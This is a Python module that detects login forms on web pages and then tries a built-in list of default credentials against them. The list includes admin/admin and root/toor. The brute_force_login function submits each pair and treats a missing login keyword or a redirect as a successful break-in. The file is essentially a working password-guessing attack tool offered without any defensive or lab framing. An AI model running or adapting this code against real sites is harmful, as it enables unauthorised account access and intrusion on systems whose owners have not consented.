from __future__ import annotations

import html.parser
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any
from urllib.request import Request, urlopen


@dataclass
class LoginForm:
    url: str
    action: str
    method: str
    username_field: str
    password_field: str
    other_fields: dict[str, str] = field(default_factory=dict)
    detected_by: str = ""


COMMON_CREDENTIALS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "password123"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "administrator"),
    ("admin", "letmein"),
    ("admin", "root"),
    ("admin", "toor"),
    ("admin", "qwerty"),
    ("admin", "changeme"),
    ("user", "user"),
    ("user", "password"),
    ("user", "123456"),
    ("guest", "guest"),
    ("test", "test"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "admin"),
    ("root", "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("admin", "p@ssw0rd"),
    ("admin", "P@ssw0rd"),
    ("admin", "Passw0rd"),
    ("admin", "s3cr3t"),
    ("admin", "secret"),
    ("admin", "welcome"),
    ("dani", "dani"),
    ("dani", "admin"),
]

LOGIN_KEYWORDS = re.compile(
    r"(login|log\s*in|sign\s*in|signin|iniciar\s*sesi[oó]n|acceso|"
    r"auth|authenticate|autenticar|entrar|username|password)",
    re.IGNORECASE,
)


class _LoginFormParser(html.parser.HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict[str, Any]] = []
        self._current: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr_dict = {k.lower(): v or "" for k, v in attrs}
        if tag == "form":
            self._current = {
                "action": attr_dict.get("action", ""),
                "method": attr_dict.get("method", "get").lower(),
                "inputs": [],
            }
        elif tag == "input" and self._current is not None:
            itype = attr_dict.get("type", "text").lower()
            iname = attr_dict.get("name", "")
            ivalue = attr_dict.get("value", "")
            self._current["inputs"].append({"type": itype, "name": iname, "value": ivalue})

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._current is not None:
            password_fields = [i for i in self._current["inputs"] if i["type"] == "password"]
            if password_fields:
                self.forms.append(self._current)
            self._current = None


def detect_login_forms(url: str, html_content: str | None = None) -> list[LoginForm]:
    """Parse HTML and find login forms."""
    if html_content is None:
        html_content = _fetch_page(url)

    parser = _LoginFormParser()
    parser.feed(html_content)

    forms: list[LoginForm] = []
    for raw in parser.forms:
        username_field = ""
        password_field = ""
        other: dict[str, str] = {}
        for inp in raw["inputs"]:
            if inp["type"] == "password":
                password_field = inp["name"]
            elif inp["type"] in ("text", "email", "") and not username_field:
                if inp["name"] and inp["name"].lower() in ("username", "user", "email", "login", "log", "user_login"):
                    username_field = inp["name"]
                else:
                    other[inp["name"]] = inp["value"]
            else:
                if inp["name"]:
                    other[inp["name"]] = inp["value"]

        if password_field:
            if not username_field:
                username_field = "username"
            action = urllib.parse.urljoin(url, raw["action"]) if raw["action"] else url
            forms.append(LoginForm(
                url=url,
                action=action,
                method=raw["method"],
                username_field=username_field,
                password_field=password_field,
                other_fields=other,
                detected_by="form_parser",
            ))
    return forms


def is_login_page(html_content: str) -> bool:
    """Quick heuristic check for login pages."""
    text_lower = html_content.lower()
    if bool(LOGIN_KEYWORDS.search(text_lower)):
        return True
    return "type=\"password\"" in html_content or "type='password'" in html_content


def detect_login_from_whatweb(whatweb_json: str | list[dict[str, Any]]) -> bool:
    """Check if whatweb output suggests a login page."""
    if isinstance(whatweb_json, str):
        try:
            data = json.loads(whatweb_json)
        except (json.JSONDecodeError, TypeError):
            return False
    else:
        data = whatweb_json
    if isinstance(data, list):
        for entry in data:
            plugins = " ".join(str(v) for v in entry.values()) if isinstance(entry, dict) else str(entry)
            if LOGIN_KEYWORDS.search(plugins):
                return True
    return False


def _fetch_page(url: str, timeout: int = 10) -> str:
    """Fetch HTML content from URL."""
    req = Request(url, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})
    resp = urlopen(req, timeout=timeout)
    body = resp.read()
    content_type = resp.headers.get("Content-Type", "")
    if "charset=" in content_type:
        enc = content_type.split("charset=")[-1].split(";")[0].strip()
    else:
        enc = "utf-8"
    return body.decode(enc, errors="replace")


def brute_force_login(
    form: LoginForm,
    credentials: list[tuple[str, str]] | None = None,
    timeout: int = 5,
) -> dict[str, Any] | None:
    """Try common credentials against a login form. Returns {'username': ..., 'password': ...} or None."""
    import urllib.request as req_lib

    creds = credentials or COMMON_CREDENTIALS
    data_template: dict[str, str] = {**form.other_fields, form.username_field: "__USER__", form.password_field: "__PASS__"}

    for username, password in creds:
        payload = {k: v.replace("__USER__", username).replace("__PASS__", password) for k, v in data_template.items()}
        encoded = urllib.parse.urlencode(payload).encode()
        try:
            if form.method == "post":
                r = req_lib.Request(form.action, data=encoded, headers={"User-Agent": "Mozilla/5.0"})
            else:
                qs = urllib.parse.urlencode(payload)
                get_url = f"{form.action}?{qs}" if "?" not in form.action else f"{form.action}&{qs}"
                r = req_lib.Request(get_url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urlopen(r, timeout=timeout)
            body = resp.read().decode("utf-8", errors="replace")
            # If the response doesn't contain "login" or "password" keywords, assume success
            if not LOGIN_KEYWORDS.search(body):
                return {"username": username, "password": password, "method_used": form.method}
            # Check for redirect or different URL
            if resp.url != form.action and not resp.url.endswith(form.url.strip("/")):
                if "/login" not in resp.url.lower():
                    return {"username": username, "password": password, "method_used": form.method}
        except Exception:
            continue
    return None
